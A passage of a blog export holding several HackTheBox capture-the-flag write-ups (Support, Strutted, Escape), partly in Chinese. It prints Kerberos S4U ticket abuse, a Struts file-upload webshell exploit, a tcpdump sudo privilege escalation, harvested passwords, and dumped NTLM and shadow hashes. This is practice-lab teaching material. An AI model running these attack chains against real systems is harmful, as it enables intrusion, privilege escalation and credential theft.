PnaLRpewZe2wgKEJ8tKKHBSTeUKJ4Ln+uFk2UWgQywV++CmNcgdMTbngHSNZGUwe6frw04MlTrsWGmy/ Z7YGVnvt5E77j5QMI9j66wWZghPxNunMBr7SZ1E8dZNEK/3HM8cnegz5RRXax+uGvw9dQi/4MLLia2wg zNxS3Vf+9wTWpHmWm4X8HwoyhZNoP7qPLc5jfFfDYQeaDXBLJFoHN1AVZpbZx0UeNsMI+LXkC8xpdDzA a2/mU3KZJyvIi6fdJQRIgRXpILmyDuW1F7Nv256Ws9vW2GDBvhDbs5Yah7cuX/jmfIx6umrKExeKWHoB Xmg1Cc6sjlarCkaqbfgVZ4baLxMz6nC67wh1fdYxCLIls7sypYj4B4rANg4uPj+riiaRLHJVWcAeXOvw zk1uZRz3/SdB9+kwmdybWMBxP5tIDcukl3K3F8gsAa8/YA0Hd16Z4DRhU9fZE0UpwwrPOJX4NZBjM+Z9 whJnZJhr3sHJ+vkMKKZrF2kSv9HyF6CmUnATDJej+Co4ad33mr9AocZfU8qHI0IBaepdJn24kGI3ye6L GKo+wQzuXfKnBj2CHRbfZ9WbwcTtWi12uy4UNaSKr93NeICN8wQUAyThGKxKYHwaEuQfJXg1/FCc7MCO lke08iOjTsqrkPO9sc4UMbSWLqEKl8CatjUvT0CB7N6d1CKxOEuE7D6nWnWEDJluIhHhYNOyWBhTJXO0 SaLes7hwlHBPkQfD3lN7JZmu749kawJvkYIQscHCmZEDqZd8FIU9Mv41jFxwcVl6PJd9ITQfknWYOspk kKe9sgXrdsHEnL4C9lbZI22WQJtPqC/UfMHLmL/0fsU/FAoqNGyhkx6/e+Hj8cloHRH6gc8ljtaGdJ8n kJSdQ9TDUR/H1eEaxnxLRFAqxaE+9/6rL+GAPXx7OLD5AUw+wrE05yBXFC4W0JzMofOzqSDMpj25uutc 9IiSOVZpcexFXEK8WboN8xsHjautyA7Et+owxglomFKdSniIwjn5QscCfZYk9ta2u1IGE5/HcKL0dAVZ zFR+8GwRHhLeG4lGI88K56YMJrFRuDgGZSMll9R+tD/4o2/BQ8RSfppjbO1ckWeB4THP3J4k1xXvWQ7v NWuzSoC12nr4Nz5bZ4G/bNtNE5m+2QOyAOUZm0tm5WQTtSOumaxiKg4W0Wk0RFOjgdQwgdGgAwIBAKKB yQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBDIivJdaItGYz/0PJ4miZFmoQ0bC1NVUFBPUlQu SFRCohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI1MDQwMzA4MjA1NVqm ERgPMjAyNTA0MDMxODIwNTVapxEYDzIwMjUwNDEwMDgyMDU1WqgNGwtTVVBQT1JULkhUQqkcMBqgAwIB AaETMBEbD2F0dGFja2Vyc3lzdGVtJA==[*] Impersonating user &#x27;administrator&#x27; to target SPN &#x27;cifs/dc.support.htb&#x27;[*] Building S4U2proxy request for service: &#x27;cifs/dc.support.htb&#x27;[*] Using domain controller: dc.support.htb (::1)[*] Sending S4U2proxy request to domain controller ::1:88 [+] S4U2proxy success![*] base64(ticket.kirbi) for SPN &#x27;cifs/dc.support.htb&#x27;: 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[+] Ticket successfully imported!*Evil-WinRM* PS C:\\lusowen&gt; .\\Rubeus.exe klist ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0Action: List Kerberos Tickets (Current User)[*] Current LUID : 0xa154c3 UserName : support Domain : SUPPORT LogonId : 0xa154c3 UserSID : S-1-5-21-1677581083-3380853377-188903654-1105 AuthenticationPackage : NTLM LogonType : Network LogonTime : 4/3/2025 12:21:45 AM LogonServer : DC LogonServerDNSDomain : support.htb UserPrincipalName : support@support.htb [0] - 0x12 - aes256_cts_hmac_sha1 Start/End/MaxRenew: 4/3/2025 1:20:55 AM ; 4/3/2025 11:20:55 AM ; 4/10/2025 1:20:55 AM Server Name : cifs/dc.support.htb @ SUPPORT.HTB Client Name : administrator @ SUPPORT.HTB Flags : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)==========================================================================$ nano ticket.b64#将base64的那段编码放进去$ base64 -d ticket.b64 &gt; ticket.kirbi$ ticketConverter.py ticket.kirbi ticket.ccache Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] converting kirbi to ccache...[+] done$ KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-passImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on dc.support.htb.....[*] Found writable share ADMIN$[*] Uploading file XUbGmpCE.exe[*] Opening SVCManager on dc.support.htb.....[*] Creating service XpwJ on dc.support.htb.....[*] Starting service XpwJ.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.20348.859](c) Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt; cd C:\\users\\administrator\\desktopC:\\Users\\Administrator\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is 955A-5CBB Directory of C:\\Users\\Administrator\\Desktop05/28/2022 04:17 AM &lt;DIR&gt; .05/28/2022 04:11 AM &lt;DIR&gt; ..04/02/2025 11:02 AM 34 root.txt 1 File(s) 34 bytes 2 Dir(s) 3,933,425,664 bytes freeC:\\Users\\Administrator\\Desktop&gt; type root.txt7a80574ef22499ca66f7699fbb5c719aC:\\Users\\Administrator\\Desktop&gt; whoamint authority\\system shell as nt authorityhashes12345678910111213141516171819202122232425Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::ldap:1104:aad3b435b51404eeaad3b435b51404ee:b735f8c7172b49ca2b956b8015eb2ebe:::support:1105:aad3b435b51404eeaad3b435b51404ee:11fbaef07d83e3f6cde9f0ff98a3af3d:::smith.rosario:1106:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::hernandez.stanley:1107:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::wilson.shelby:1108:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::anderson.damian:1109:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::thomas.raphael:1110:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::levine.leopoldo:1111:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::raven.clifton:1112:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::bardot.mary:1113:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::cromwell.gerard:1114:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::monroe.david:1115:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::west.laura:1116:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::langley.lucy:1117:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::daughtler.mabel:1118:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::stoll.rachelle:1119:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::ford.victoria:1120:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::DC$:1000:aad3b435b51404eeaad3b435b51404ee:24501f0c63c517085f93146df7b3bff7:::MANAGEMENT$:2601:aad3b435b51404eeaad3b435b51404ee:3f99f2f26988d1f348d378e84f86bc58:::lusowen$:5601:aad3b435b51404eeaad3b435b51404ee:6927391aa711001aa774ea55c915fb44:::attackersystem$:5602:aad3b435b51404eeaad3b435b51404ee:ef266c6b963c0bb683941032008ad47f:::","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"HackTheBox——HTB Strutted Writeup","slug":"HackTheBox——HTB Strutted Writeup/HackTheBox——HTB Strutted Writeup","date":"2025-06-19T13:59:05.063Z","updated":"2025-06-19T13:59:05.067Z","comments":true,"path":"2025/06/19/HackTheBox——HTB Strutted Writeup/HackTheBox——HTB Strutted Writeup/","permalink":"http://example.com/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/","excerpt":"","text":"Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习在退役吧唧中的免费吧唧 nmap12345678910111213141516PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://strutted.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.19Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 先把域名加到hosts里面 看一眼web界面 source code上来就是让上传文件先看看别的，上下都有小字 1234567891011Upload Your Images, Get a Shareable LinkInstantly upload an image and receive a unique, shareable link. Keep your images secure, accessible, and easy to share—anywhere, anytime.Supported file types: JPG, JPEG, PNG, GIF上传您的图像，获取可共享链接立即上传图像并接收独特的可共享链接。确保您的图像随时随地安全、可访问且易于共享。支持的文件类型：JPG、JPEG、PNG、GIFInterested in our setup?We provide a Docker image that showcases the Strutted™ environment. Click the Download link on the menu to explore our Docker image to see how our platform is configured, and use it as a base template for your own projects.对我们的设置感兴趣吗？我们提供了一个展示 Strutted™ 环境的 Docker 映像。单击菜单上的“下载”链接来探索我们的 Docker 映像，了解我们的平台是如何配置的，并将其用作您自己的项目的基本模板。 提示说给了一个docker映像，在右上角download可以下载下来 123[10:03:10] athena:Strutted $ lscontext.xml Dockerfile nmap.txt README.md strutted strutted.zip tomcat-users.xml... 东西有点多，都看看 123456789[10:07:04] athena:Strutted $ cat tomcat-users.xml &lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&lt;tomcat-users&gt; &lt;role rolename=&quot;manager-gui&quot;/&gt; &lt;role rolename=&quot;admin-gui&quot;/&gt; &lt;user username=&quot;admin&quot; password=&quot;skqKY6360z!Y&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;&lt;/tomcat-users&gt; 有一个密码了，但是没啥用， Find struts2 exploitCVE-2024-53677翻源码可以看到版本Google一下（其实源码还可以翻到点别的，比如说CVE）Google翻到了CVE-2024-53677的poc，git下来尝试一下（在Google上找一个jsp的webshell） analysis upload packets返回了200，但是response里面还是home页面的信息，burp抓包看一下吧直接上传jsp会提示Supported file types: JPG, JPEG, PNG, GIF!尝试绕过一下，改一下后缀又提示不是图像那只能加魔术字了 找一个jpg或者png文件传上去，burp抓去发送到repeater，将魔术字下面的内容替换成我们的jspshell内容 昨天看了一篇文章，是关于绕过的，但是也看到了一个熟悉的身影——multipart&#x2F;form-data; boundary&#x3D;的 上传成功，但是没有办法解析成jsp回看一下上面CVE的详解去可能原始的poc是这个？上面用的那个是人家自己改的，都运用top.UploadFileName去尝试覆盖文件名坏习惯，有poc不先看好人家的利用原理和具体过程 adjust upload packets这样的话双写一下boundary&#x3D;尝试一下覆盖在res里面可以看到有上传成功，访问一下ok，可以进入shell了 Shell As Tomcat看下用户 123456tomcat@strutted:~$ cat /etc/passwd | grep shcat /etc/passwd | grep shroot:x:0:0:root:/root:/bin/bashsshd:x:106:65534::/run/sshd:/usr/sbin/nologinfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinjames:x:1000:1000:Network Administrator:/home/james:/bin/bash 看样子下一步是james了当前用户是tomcat，找一下配置文件 1234567891011121314151617181920212223242526tomcat@strutted:/etc/tomcat9$ ls -lals -latotal 220drwxr-xr-x 4 root root 4096 Jan 15 14:30 .drwxr-xr-x 107 root root 4096 Jan 21 13:54 ..drwxrwxr-x 3 root tomcat 4096 Jan 15 14:30 Catalina-rw-r----- 1 root tomcat 7276 Jan 15 2022 catalina.properties-rw-r----- 1 root tomcat 1400 Jan 15 2022 context.xml-rw-r----- 1 root tomcat 1149 Jan 15 2022 jaspic-providers.xml-rw-r----- 1 root tomcat 2799 Jul 19 2022 logging.propertiesdrwxr-xr-x 2 root tomcat 4096 Jan 15 14:30 policy.d-rw-r----- 1 root tomcat 7606 Jan 7 10:40 server.xml-rw-r----- 1 root tomcat 2902 Jan 11 13:49 tomcat-users.xml-rw-r----- 1 root tomcat 172359 Jan 15 2022 web.xmltomcat@strutted:/etc/tomcat9$ grep &#x27;password&#x27; -ri .grep &#x27;password&#x27; -ri ../tomcat-users.xml: you must define such a user - the username and password are arbitrary../tomcat-users.xml: will also need to set the passwords to something appropriate../tomcat-users.xml: &lt;user username=&quot;admin&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;manager-gui&quot;/&gt;./tomcat-users.xml: &lt;user username=&quot;robot&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;manager-script&quot;/&gt;./tomcat-users.xml: &lt;user username=&quot;admin&quot; password=&quot;IT14d6SSP81k&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;./tomcat-users.xml: them. You will also need to set the passwords to something appropriate../tomcat-users.xml: &lt;user username=&quot;tomcat&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat&quot;/&gt;./tomcat-users.xml: &lt;user username=&quot;both&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat,role1&quot;/&gt;./tomcat-users.xml: &lt;user username=&quot;role1&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;role1&quot;/&gt;./server.xml: &lt;!-- Use the LockOutRealm to prevent attempts to guess user passwords 找到一个密码IT14d6SSP81k,试一下james Shell As JamesGTFObins find tcpdump exploit因为有密码可以先看下sudo -l 123456james@strutted:~$ sudo -lMatching Defaults entries for james on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser james may run the following commands on localhost: (ALL) NOPASSWD: /usr/sbin/tcpdump 翻阅GTFObins发现有利用 123456789101112james@strutted:~$ COMMAND=&#x27;chmod 4777 /bin/bash&#x27;TF=$(mktemp)echo &quot;$COMMAND&quot; &gt; $TFchmod +x $TFsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z roottcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytesMaximum file limit reached: 11 packet captured4 packets received by filter0 packets dropped by kerneljames@strutted:~$ bash -pbash-5.1# get root Hashes1234567891011121314151617181920212223242526272829303132333435root:$y$j9T$4kM4HKyBvH.VNLjh.Zd60/$27BeC7cFIgPH.bVrllpoxXQwtc4tMCN6EZkI9Tqbw/B:20100:0:99999:7:::daemon:*:19405:0:99999:7:::bin:*:19405:0:99999:7:::sys:*:19405:0:99999:7:::sync:*:19405:0:99999:7:::games:*:19405:0:99999:7:::man:*:19405:0:99999:7:::lp:*:19405:0:99999:7:::mail:*:19405:0:99999:7:::news:*:19405:0:99999:7:::uucp:*:19405:0:99999:7:::proxy:*:19405:0:99999:7:::www-data:*:19405:0:99999:7:::backup:*:19405:0:99999:7:::list:*:19405:0:99999:7:::irc:*:19405:0:99999:7:::gnats:*:19405:0:99999:7:::nobody:*:19405:0:99999:7:::_apt:*:19405:0:99999:7:::systemd-network:*:19405:0:99999:7:::systemd-resolve:*:19405:0:99999:7:::messagebus:*:19405:0:99999:7:::systemd-timesync:*:19405:0:99999:7:::pollinate:*:19405:0:99999:7:::sshd:*:19405:0:99999:7:::syslog:*:19405:0:99999:7:::uuidd:*:19405:0:99999:7:::tcpdump:*:19405:0:99999:7:::tss:*:19405:0:99999:7:::landscape:*:19405:0:99999:7:::fwupd-refresh:*:19405:0:99999:7:::usbmux:*:19474:0:99999:7:::lxd:!:19474::::::tomcat:!*:20095::::::james:$y$j9T$Agb7G27RJ0LCkmXQ3kDEK0$xoWkrSDF/pC4dkrIlBKe0LpYWCZH4YTz0NJ/zEn8.59:20100:0:99999:7:::","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"HackTheBox——Tracks AD Escape","slug":"Escape/HackTheBox——Tracks AD Escape","date":"2025-06-19T13:59:05.047Z","updated":"2025-06-19T13:59:05.047Z","comments":true,"path":"2025/06/19/Escape/HackTheBox——Tracks AD Escape/","permalink":"http://example.com/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/","excerpt":"","text":"Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-30 15:00:23Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel| Not valid before: 2024-01-18T23:03:57 |_Not valid after: 2074-01-05T23:03:57|_ssl-date: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner time.445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel| Not valid before: 2024-01-18T23:03:57|_Not valid after: 2074-01-05T23:03:57|_ssl-date: 2025-04-30T15:01:59+00:00; +8h00m00s from scanner time.1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM|_ms-sql-info: ERROR: Script execution failed (use -d to debug)|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2025-04-30T14:54:57|_Not valid after: 2055-04-30T14:54:57 |_ssl-date: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel| Not valid before: 2024-01-18T23:03:57|_Not valid after: 2074-01-05T23:03:57|_ssl-date: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner time.3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel| Not valid before: 2024-01-18T23:03:57|_Not valid after: 2074-01-05T23:03:57|_ssl-date: 2025-04-30T15:01:59+00:00; +8h00m00s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf .NET Message Framing49667/tcp open msrpc Microsoft Windows RPC49689/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049690/tcp open msrpc Microsoft Windows RPC49711/tcp open msrpc Microsoft Windows RPC49721/tcp open msrpc Microsoft Windows RPCWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)No exact OS matches for host (test conditions non-ideal).Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2025-04-30T15:01:23|_ start_date: N/A|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s 先加hosts smb enum12345678910111213141516$ nxc smb sequel.htb -u anonymous -p &#x27;&#x27;SMB 10.129.228.253 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) SMB 10.129.228.253 445 DC [+] sequel.htb\\anonymous: (Guest)$ nxc smb sequel.htb -u guest -p &#x27;&#x27; --sharesSMB 10.129.228.253 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) SMB 10.129.228.253 445 DC [+] sequel.htb\\guest: SMB 10.129.228.253 445 DC [*] Enumerated sharesSMB 10.129.228.253 445 DC Share Permissions RemarkSMB 10.129.228.253 445 DC ----- ----------- ------SMB 10.129.228.253 445 DC ADMIN$ Remote AdminSMB 10.129.228.253 445 DC C$ Default shareSMB 10.129.228.253 445 DC IPC$ READ Remote IPCSMB 10.129.228.253 445 DC NETLOGON Logon server share SMB 10.129.228.253 445 DC Public READ SMB 10.129.228.253 445 DC SYSVOL Logon server share 可以看到smb有一个Public和IPC$可读，不要急，一个一个来 12345678910111213$ smbclient \\\\\\\\sequel.htb\\\\Public -U guestCan&#x27;t load /etc/samba/smb.conf - run testparm to debug itPassword for [WORKGROUP\\guest]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Sat Nov 19 19:51:25 2022 .. D 0 Sat Nov 19 19:51:25 2022 SQL Server Procedures.pdf A 49551 Fri Nov 18 21:39:43 2022 5184255 blocks of size 4096. 1440326 blocks availablesmb: \\&gt; promptsmb: \\&gt; mget *getting file \\SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (70.3 KiloBytes/sec) (average 70.3 KiloBytes/sec) 两个可读只有一个pdf，那顺便在枚举一下user吧 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$ nxc smb sequel.htb -u guest -p &#x27;&#x27; --rid-bruteSMB 10.129.228.253 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) SMB 10.129.228.253 445 DC [+] sequel.htb\\guest: SMB 10.129.228.253 445 DC 498: sequel\\Enterprise Read-only Domain Controllers (SidTypeGroup)SMB 10.129.228.253 445 DC 500: sequel\\Administrator (SidTypeUser)SMB 10.129.228.253 445 DC 501: sequel\\Guest (SidTypeUser)SMB 10.129.228.253 445 DC 502: sequel\\krbtgt (SidTypeUser)SMB 10.129.228.253 445 DC 512: sequel\\Domain Admins (SidTypeGroup)SMB 10.129.228.253 445 DC 513: sequel\\Domain Users (SidTypeGroup)SMB 10.129.228.253 445 DC 514: sequel\\Domain Guests (SidTypeGroup)SMB 10.129.228.253 445 DC 515: sequel\\Domain Computers (SidTypeGroup)SMB 10.129.228.253 445 DC 516: sequel\\Domain Controllers (SidTypeGroup)SMB 10.129.228.253 445 DC 517: sequel\\Cert Publishers (SidTypeAlias)SMB 10.129.228.253 445 DC 518: sequel\\Schema Admins (SidTypeGroup)SMB 10.129.228.253 445 DC 519: sequel\\Enterprise Admins (SidTypeGroup)SMB 10.129.228.253 445 DC 520: sequel\\Group Policy Creator Owners (SidTypeGroup)SMB 10.129.228.253 445 DC 521: sequel\\Read-only Domain Controllers (SidTypeGroup)SMB 10.129.228.253 445 DC 522: sequel\\Cloneable Domain Controllers (SidTypeGroup)SMB 10.129.228.253 445 DC 525: sequel\\Protected Users (SidTypeGroup)SMB 10.129.228.253 445 DC 526: sequel\\Key Admins (SidTypeGroup)SMB 10.129.228.253 445 DC 527: sequel\\Enterprise Key Admins (SidTypeGroup)SMB 10.129.228.253 445 DC 553: sequel\\RAS and IAS Servers (SidTypeAlias)SMB 10.129.228.253 445 DC 571: sequel\\Allowed RODC Password Replication Group (SidTypeAlias)SMB 10.129.228.253 445 DC 572: sequel\\Denied RODC Password Replication Group (SidTypeAlias)SMB 10.129.228.253 445 DC 1000: sequel\\DC$ (SidTypeUser)SMB 10.129.228.253 445 DC 1101: sequel\\DnsAdmins (SidTypeAlias)SMB 10.129.228.253 445 DC 1102: sequel\\DnsUpdateProxy (SidTypeGroup)SMB 10.129.228.253 445 DC 1103: sequel\\Tom.Henn (SidTypeUser)SMB 10.129.228.253 445 DC 1104: sequel\\Brandon.Brown (SidTypeUser)SMB 10.129.228.253 445 DC 1105: sequel\\Ryan.Cooper (SidTypeUser)SMB 10.129.228.253 445 DC 1106: sequel\\sql_svc (SidTypeUser)SMB 10.129.228.253 